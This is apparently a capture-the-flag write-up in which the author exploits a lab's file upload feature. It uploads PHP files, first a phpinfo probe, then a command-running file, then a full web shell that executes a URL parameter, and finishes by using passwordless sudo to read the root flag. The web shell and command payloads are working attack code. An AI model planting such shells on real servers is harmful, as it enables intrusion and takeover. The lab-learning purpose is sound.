# 1. Analysis
There is a file upload module.
![](Pasted%20image%2020250506103139.png)
Try upload file who load php info.
```
<?php phpinfo(); ?>
```
It responsed with path location of the uploaded file.
![](Pasted%20image%2020250506105450.png)
Try to access the the path. And it response with also with php info. it shows that it potentially had file upload vulnerability dan may be can also have command injection and RCE too (I hope).
![](Pasted%20image%2020250506105654.png)
# 2. Exploitation
Try upload php file who execute linux command, and it works!.
```
<?php system('ls -lha');?>
```
![](Pasted%20image%2020250506110319.png)

Try upload RCE, it works
```
<?php
$command = isset($_GET['command']) ? $_GET['command'] : '';
$output = [];
$return_var = 0;
exec($command, $output, $return_var);
echo '<h1>Exploiting RCE</h1>';
echo 'Command: '.$command;
echo '\n<pre>';
echo implode("\n", $output);
echo '</pre>';
?>
```
![](Pasted%20image%2020250506111251.png)

Check sudo -l, no password at all
![](Pasted%20image%2020250506111735.png)

access /root to get flag
![](Pasted%20image%2020250506111915.png)

# 3. Conclusion
Knowledge need to know:
- File upload vulnerability
- PHP
- Linux command
- RCE

**Hurray! You solved this challenge.**
